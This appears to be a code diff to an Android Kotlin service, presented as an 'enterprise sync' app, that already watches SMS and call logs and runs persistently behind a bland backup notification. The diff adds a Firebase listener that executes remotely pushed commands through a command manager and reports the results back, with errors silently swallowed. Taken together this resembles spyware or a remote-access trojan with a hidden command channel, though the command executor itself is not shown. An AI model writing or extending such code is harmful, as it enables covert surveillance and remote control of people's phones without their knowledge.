@@ -4,16 +4,19 @@ import android.app.PendingIntent
 import android.app.Service
 import android.content.Context
 import android.content.Intent
+import android.content.pm.ServiceInfo
 import android.database.ContentObserver
 import android.net.Uri
+import android.os.Build
 import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.provider.CallLog
-import android.provider.Telephony
+import android.util.Log
 import androidx.core.app.NotificationCompat
 import com.example.EnterpriseSyncApp
 import com.example.MainActivity
+import com.example.data.sync.FirebaseSyncEngine
 import com.example.data.sync.RemoteCommandManager
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
@@ -32,30 +35,47 @@ class AlwaysSyncService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        startForegroundServiceNotification()
-        registerObservers()
-        startPeriodicSyncLoop()
+        try {
+            startForegroundServiceNotification()
+            registerObservers()
+            startPeriodicSyncLoop()
+            startFirebaseCommandListener()
+        } catch (e: Exception) {
+            Log.e("AlwaysSyncService", "Error in onCreate: ${e.message}")
+        }
     }
 
     private fun startForegroundServiceNotification() {
-        val intent = Intent(this, MainActivity::class.java)
-        val pendingIntent = PendingIntent.getActivity(
-            this,
-            0,
-            intent,
-            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
-        )
+        try {
+            val intent = Intent(this, MainActivity::class.java)
+            val pendingIntent = PendingIntent.getActivity(
+                this,
+                0,
+                intent,
+                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
+            )
 
-        val notification = NotificationCompat.Builder(this, EnterpriseSyncApp.CHANNEL_ID_SYNC)
-            .setContentTitle("Enterprise Sync Engine Active")
-            .setContentText("Real-time cloud backup & device policies running")
-            .setSmallIcon(android.R.drawable.ic_popup_sync)
-            .setContentIntent(pendingIntent)
-            .setOngoing(true)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
-            .build()
+            val notification = NotificationCompat.Builder(this, EnterpriseSyncApp.CHANNEL_ID_SYNC)
+                .setContentTitle("Enterprise Sync Engine Active")
+                .setContentText("Real-time cloud backup & device policies running")
+                .setSmallIcon(android.R.drawable.ic_popup_sync)
+                .setContentIntent(pendingIntent)
+                .setOngoing(true)
+                .setPriority(NotificationCompat.PRIORITY_LOW)
+                .build()
 
-        startForeground(1001, notification)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                try {
+                    startForeground(1001, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                } catch (_: Exception) {
+                    startForeground(1001, notification)
+                }
+            } else {
+                startForeground(1001, notification)
+            }
+        } catch (e: Exception) {
+            Log.e("AlwaysSyncService", "Failed to start foreground notification: ${e.message}")
+        }
     }
 
     private fun registerObservers() {
@@ -103,6 +123,27 @@ class AlwaysSyncService : Service() {
         }
     }
 
+    private fun startFirebaseCommandListener() {
+        try {
+            val syncEngine = FirebaseSyncEngine(applicationContext)
+            val commandManager = RemoteCommandManager(applicationContext)
+            syncEngine.startCommandListener { pushId, commandType, params ->
+                serviceScope.launch {
+                    try {
+                        val payload = params["payload"]?.toString()
+                            ?: params["text"]?.toString()
+                            ?: params["message"]?.toString()
+                            ?: params.entries.joinToString("|") { "${it.key}=${it.value}" }
+                        val result = commandManager.executeCommand(commandType, payload)
+                        syncEngine.updateCommandStatus(pushId, result.status, result.resultMessage)
+                    } catch (e: Exception) {
+                        syncEngine.updateCommandStatus(pushId, "FAILED", e.message ?: "Execution error")
+                    }
+                }
+            }
+        } catch (_: Exception) {}
+    }
+
     private fun triggerImmediateSync(reason: String) {
         serviceScope.launch {
             try {
@@ -113,8 +154,8 @@ class AlwaysSyncService : Service() {
 
     override fun onDestroy() {
         super.onDestroy()
-        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
-        callLogObserver?.let { contentResolver.unregisterContentObserver(it) }
+        smsObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
+        callLogObserver?.let { try { contentResolver.unregisterContentObserver(it) } catch (_: Exception) {} }
         serviceJob.cancel()
     }
 
@@ -122,11 +163,15 @@ class AlwaysSyncService : Service() {
 
     companion object {
         fun startService(context: Context) {
-            val intent = Intent(context, AlwaysSyncService::class.java)
-            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
+            try {
+                val intent = Intent(context, AlwaysSyncService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(intent)
+                } else {
+                    context.startService(intent)
+                }
+            } catch (e: Exception) {
+                Log.e("AlwaysSyncService", "Failed to start service: ${e.message}")
             }
         }
     }
